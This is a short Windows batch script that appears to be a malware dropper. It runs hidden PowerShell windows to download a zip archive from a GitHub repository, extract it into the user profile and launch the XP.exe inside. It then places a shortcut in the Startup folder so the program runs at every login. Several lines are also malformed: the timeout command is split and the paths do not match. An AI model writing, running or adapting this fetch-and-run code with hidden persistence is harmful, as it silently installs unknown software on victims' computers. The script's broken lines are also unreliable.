@echo off

PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms1.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
timeout
/t 120/nobreak


PowerShell.exe -NoProfile -WindowStyle hidden -Command "Expand-Archive -Path 'ms.zip' -DestinationPath '%USERPROFILE%\ms' -Force"

start "" XP.exe

set SourceExe=%USERPROFILE%\ms\ms\XP.exe
set DestinationPath=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SHORTCUT.lnk

powershell.exe -WindowStyle hidden -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%DestinationPath%'); $Shortcut.TargetPath = '%SourceExe%'; $Shortcut.Save()"